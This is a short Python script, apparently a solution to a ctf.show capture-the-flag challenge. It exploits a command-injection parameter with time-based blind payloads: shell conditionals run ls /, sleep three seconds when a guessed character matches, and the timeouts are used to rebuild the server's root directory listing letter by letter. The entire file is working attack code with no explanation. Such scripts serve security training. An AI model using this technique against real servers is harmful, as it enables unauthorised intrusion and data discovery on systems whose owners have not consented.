import requests
import time
import string
str=string.ascii_letters+string.digits+'_'	#生成所有字母与数字[a-zA-Z0-9]
result=""
for i in range(1,5):
	key=0
	for j in range(1,15):
		if key==1:
			break
		for n in str:
			payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)
			#print(payload)
			url="http://137122c7-7cba-4bc3-ac4c-c654048e474d.challenge.ctf.show:8080/?c="+payload
			try:
				requests.get(url,timeout=(2.5,2.5))
			except:
			    result=result+n
			    print(result)
			    break
			if n=='_':
				key=1
	result+=" "
